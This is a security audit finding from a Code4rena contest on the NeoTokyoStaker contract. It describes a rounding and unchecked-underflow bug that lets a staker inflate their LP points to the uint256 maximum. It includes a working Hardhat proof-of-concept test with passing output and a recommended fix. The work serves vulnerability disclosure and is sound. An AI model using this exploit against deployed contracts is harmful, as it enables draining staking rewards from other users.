# Original link
https://github.com/code-423n4/2023-03-neotokyo-findings/issues/187
# Lines of code

https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L1154-L1164
https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L1622-L1631


# Vulnerability details

## Impact
Currently `_stakeLP` function calculates the `points` this way:

```solidity
contracts/staking/NeoTokyoStaker.sol

1155: uint256 points = amount * 100 / 1e18 * timelockMultiplier / _DIVISOR;
```

The whole accounting logic:

```solidity
    unchecked {
        uint256 points = amount * 100 / 1e18 * timelockMultiplier / _DIVISOR;

        // Update the caller's LP token stake.
        stakerLPPosition[msg.sender].timelockEndTime =
            block.timestamp + timelockDuration;
        stakerLPPosition[msg.sender].amount += amount;
        stakerLPPosition[msg.sender].points += points;

        // Update the pool point weights for rewards.
        pool.totalPoints += points;
    }
```

Everything is fine except the `points` value. The calculation is implemented this way:

If someone tries to stake `0.001` which is `1e15` the current calculation will be:
`a = (1e15 * 100) => 1e17`
`b = (a / 1e18) => 1e17 / 1e18 => 0`

This calculation will be rounded to 0 always:
`stakerLPPosition[msg.sender].points += 0`.

То prevent the rounding `amount` should be at least `1e16`, so this can be easily spotted by malicious user and can stake 10 times `0.001` for minimum period of 30 days, which will make his amount to be `1e16`

After this values are:
* `stakerLPPosition[msg.sender].amount = 1e16`
* `stakeLPPosition[msg.sender].points = 0`

Problems come when this user now wants to withdraw his position, calculations are the same way as we mentioned above:

```solidity
    unchecked {
        uint256 points = amount * 100 / 1e18 * lpPosition.multiplier / _DIVISOR;

        // Update the caller's LP token stake.
        lpPosition.amount -= amount;
        lpPosition.points -= points;

        // Update the pool point weights for rewards.
        pool.totalPoints -= points;
    }
```

This time `points` will not be rounded to 0, instead the calculation will behave as intended, means that the calculated `points` will be:

`points = 1e16 * 100 / 1e18 * 100 / 100` => `1e18 / 1e18` => 1

Because the formula is in `unchecked` block, `0 - 1` will give `type(uint256).max` and the current `points` of user will be `type(uint256).max`

NOTE: If he is the first one `pool.totalPoints` also will be that much.

Assuming that the user will stake for minimum 30 days, for this exploit he should wait 10 * 30 days = 300 days.

## Proof of Concept
The following test passes:

```js
    it.only('Get max amount of points', async () => {

        // Configure the LP token contract address on the staker.
        await NTStaking.connect(owner.signer).configureLP(LPToken.address);

        let priorBlockNumber = await ethers.provider.getBlockNumber();
        let priorBlock = await ethers.provider.getBlock(priorBlockNumber);
        aliceStakeTime = priorBlock.timestamp;

        // Stake 0.001, 10 times
        for(let i = 0; i < 10; i++) {
            await NTStaking.connect(alice.signer).stake(
                ASSETS.LP.id,
                TIMELOCK_OPTION_IDS['30'],
                ethers.utils.parseEther('0.001'), //1e15
                0,
                0
            );
        }

        let alicePosition = await NTStaking.getStakerPositions(alice.address);

        alicePosition.stakedLPPosition.amount.should.be.equal(
            ethers.utils.parseEther('0.01') // 1e16
        );
        alicePosition.stakedLPPosition.points.should.be.equal(0); // points = 0

        await ethers.provider.send('evm_setNextBlockTimestamp', [
            aliceStakeTime + ((60 * 60 * 24 * 30) * 10) // for every stake 30 days making it 10 * 30 = 300 days
        ]);

        let aliceInitialLpBalance = await LPToken.balanceOf(alice.address);
        await NTStaking.connect(alice.signer).withdraw(
            ASSETS.LP.id,
            ethers.utils.parseEther('0.01')
        );
        let aliceLpBalance = await LPToken.balanceOf(alice.address);
        aliceLpBalance.sub(aliceInitialLpBalance).should.be.equal(
            ethers.utils.parseEther('0.01')
        );

        alicePosition = await NTStaking.getStakerPositions(alice.address);

        // Alice now has MaxUint256 amount of points
        alicePosition.stakedLPPosition.points.should.be.equal(
            ethers.constants.MaxUint256
        )
    });
```

```
  Testing BYTES 2.0 & Neo Tokyo Staker
    with example configuration
      with staked LP tokens
        ✔ Get max amount of points (347ms)


  1 passing (8s)
```

## Tools Used

Manual, Jest

## Recommended Mitigation Steps

Every time before substracting in `unchecked` block make sure that the calculation will not underflow and the same way will not overflow.

```solidity
require(a >= b);
c = a - b;
```